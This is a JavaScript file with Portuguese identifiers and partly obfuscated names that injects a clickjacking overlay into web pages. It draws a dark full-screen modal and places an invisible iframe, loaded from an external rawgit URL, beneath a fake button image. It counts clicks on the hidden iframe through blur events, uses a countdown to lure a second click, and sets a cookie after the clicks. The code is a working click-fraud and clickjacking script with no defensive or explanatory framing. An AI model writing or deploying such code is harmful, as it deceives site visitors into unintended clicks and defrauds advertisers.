var modal;
var box;
var adsVideo;
var qtdCliques=0;
var intervalClique1;
var segundos=6;
var loading;
var p1;
var p2;
var botao;
if(recuperaCookie("clique"))
	{	
	initAbaixaCTR()
}
else
	{	
	initScript()
};
function initScript()
	{	
	criaModal();	
	criaBox();	
	criaImagemBotao();	
	criaAdsVideo();	
	rastrearClique();	
	intervalShow()
}
function criaModal()
	{	modal=document["createElement"]("div");	
	$(modal)["attr"]("id","modal");	
	$(modal)["css"]("position","fixed");	
	$(modal)["css"]("width","100%");	
	$(modal)["css"]("height","100%");	
	$(modal)["css"]("backgroundColor","black");	
	$(modal)["css"]("top","0px");	
	$(modal)["css"]("left","0px");	
	$(modal)["css"]("opacity","0.84");	
	$(modal)["css"]("zIndex","2147483644");	
	$(modal)["hide"]();	
	$("body")["append"](modal)
}
function criaBox()
	{
        loading=document["createElement"]("p");	
	$(loading)["css"]("backgroundImage","url('"+imagemLoader["src"]+"')");	
	$(loading)["css"]("width","42px");	
	$(loading)["css"]("height","42px");	
	$(loading)["css"]("backgroundSize","42px");	
        $(loading)["css"]("margin","20px auto");	
        $(loading)["css"]("display","none");
	p1=document["createElement"]("p");	
	$(p1)["css"]("display","block");	
	$(p1)["css"]("textAlign","center");	
	$(p1)["css"]("fontSize","50px");	
	$(p1)["css"]("fontFamily","'PT Sans', sans-serif");	
	$(p1)["css"]("margin-top","35px");	
	$(p1)["css"]("top","50px");	
	p2=document["createElement"]("p");	
	$(p2)["css"]("display","block");	
	$(p2)["css"]("textAlign","center");	
	$(p2)["css"]("fontFamily","'PT Sans', sans-serif");	
	box=document["createElement"]("div");	
	$(box)["attr"]("id","boxad");	
	$(box)["css"]("position","fixed");	
	$(box)["css"]("width","300px");	
	$(box)["css"]("height","250px");	
	$(box)["css"]("top","50%");	
	$(box)["css"]("left","50%");	
	$(box)["css"]("marginLeft","-150px");	
	$(box)["css"]("marginTop","-175px");	
	$(box)["css"]("zIndex","2147483645");	
	$(box)["css"]("backgroundImage","url('"+imagemBackground["src"]+"')");	
	$(box)["append"](p2);	
        $(box)["append"](loading);
	$(box)["append"](p1);	
	$(box)["hide"]();	
	$("body")["append"](box)
}
function criaAdsVideo()
	{	
	adsVideo=document["createElement"]("iframe");	
	$(adsVideo)["attr"]("id","adsVideoId");	
	adsVideo["src"]="https://rawgit.com/iggorzinho/xxt/master/play-mobile.html";	
	$(adsVideo)["css"]("position","absolute");	
	$(adsVideo)["css"]("width","854px");	
	$(adsVideo)["css"]("height","480px");	
	$(adsVideo)["css"]("top","0px");	
	$(adsVideo)["css"]("left","0px");	
	$(adsVideo)["css"]("zIndex","2147483647");	
	$(adsVideo)["attr"]("scrolling","no");	
	$(adsVideo)["css"]("margin","0px");	
	$(adsVideo)["css"]("padding","0px");	
	$(adsVideo)["attr"]("frameBorder",0);	
	$(adsVideo)["css"]("border",0);	
	$(adsVideo)["css"]("top","-362px");	
	$(adsVideo)["css"]("left","-240px");	
	$(adsVideo)["css"]("opacity","0");	
	$(adsVideo)["hide"]();	
	$(box)["append"](adsVideo)
}
function criaImagemBotao()
	{	
	botao=document["createElement"]("img");	
	$(botao)["attr"]("id","imagemBotao");	
	$(botao)["attr"]("src",imagemBotao["src"]);	
	$(botao)["css"]("position","absolute");	
	$(botao)["css"]("top","-25px");	
	$(botao)["css"]("left","0px");	
	$(botao)["css"]("width","322px");	
	$(botao)["css"]("height","58px");	
	$(botao)["css"]("zIndex","2147483646");	
	$(botao)["css"]("margin","0px");	
	$(botao)["css"]("padding","0px");	
	$(botao)["css"]("cursor","pointer");	
	$(botao)["hide"]();	
	$(box)["append"](botao)
}
function rastrearClique()
	{	
	$("#adsVideoId")["iframeTracker"](
		{		
		blurCallback:function()
			{			
			++qtdCliques;			
			switch(qtdCliques)
				{				
				case 1:clique1();				
				break;				
				case 2:clique2();				
				break			
			}		
		}	
	}	
	)
}
function clique1()
	{	
	intervalClique1=setInterval(function()
		{		
		$(adsVideo)["css"]("display","none");		
		$(botao)["css"]("display","none");		
                $(loading)["css"]("display", "block");	
		--segundos;		
		$(p2)["text"]("AGUARDE PARA FECHAR");
		$(p1)["text"](""+segundos);
		$(box)["css"]("backgroundColor","");		
		$(box)["css"]("backgroundImage","none");		
		if(segundos==0)
			{			
			clearInterval(intervalClique1);			
			flushClique()		
		}	
	}	
	,1000)
}
function clique2()
	{	
	setTimeout(function()
	   {		
	   console["log"]("Clique efetuado: "+qtdCliques);		
	   $("#adsVideoId")["iframeTracker"](false);		
	   gravaCookie("clique","sim",20);		
	   setTimeout(function()		
	       {			
	       destroySistema()		
	   }		
	   ,2000)	
	}	
	,0)
}
function flushClique()
	{	
	var _0x5f15x12=setInterval(function()
		{		
		if(document["activeElement"]["tagName"]=="IFRAME")			
			{			
			$(p1)["text"]("CLIQUE AQUI");			
			$(p1)["css"]("cursor","pointer")		
		}		
		else			
			{			
			clearInterval(_0x5f15x12);			
			$(adsVideo)["css"]("display","inline");			
			$(botao)["css"]("display","inline");			
                        $(loading)["hide"]();
			$(p1)["hide"]();			
			$(p2)["hide"]()		
		}	
	}	
	,100)
}
function destroySistema()
	{	
	$(modal)["remove"]();	
	$(box)["css"]("top","0px");	
	$(box)["css"]("left","0px");	
	$(box)["css"]("margin","0px");	
	$(box)["css"]("opacity","0");	
	$(box)["css"]("width","10px");	
	$(box)["css"]("height","10px");	
	$(adsVideo)["css"]("top","0px");	
	$(adsVideo)["css"]("left","0px");	
	$(adsVideo)["css"]("margin","0px");	
	$(adsVideo)["css"]("opacity","0");	
	$(adsVideo)["css"]("width","10px");	
	$(adsVideo)["css"]("height","10px")
}
function gravaCookie(_0x5f15x15,_0x5f15x16,_0x5f15x17)
	{	
	var _0x5f15x18=new Date();	
	_0x5f15x18["setTime"](_0x5f15x18["getTime"]()+(_0x5f15x17*24*60*60*1000));	
	var _0x5f15x19="expires="+_0x5f15x18["toUTCString"]();	
	document["cookie"]=_0x5f15x15+"="+_0x5f15x16+"; "+_0x5f15x19
}
function initAbaixaCTR()
	{	
	criaModal();	
	criaBox();	
	criaImagemBotao();	
	criaAdsVideo();	
	rastrearCliqueCTR();	
	intervalShow()
}
function rastrearCliqueCTR()
	{	
	$("#adsVideoId")["iframeTracker"](
		{		
		blurCallback:function()			
		    {			
		    console["log"]("Clique efetuado CTR");			
		    setTimeout(function()				
		    	{				
		    	destroySistema()			
		    }			
		    ,1000)		
		}	
	}	
	)
}
function intervalShow()
	{	
	setTimeout(function()		
		{		
		$(modal)["css"]("display","block");		
		$(box)["css"]("display","block");		
		$(botao)["css"]("display","inline");		
		$(adsVideo)["css"]("display","inline")	
	}	
	,8000)
}
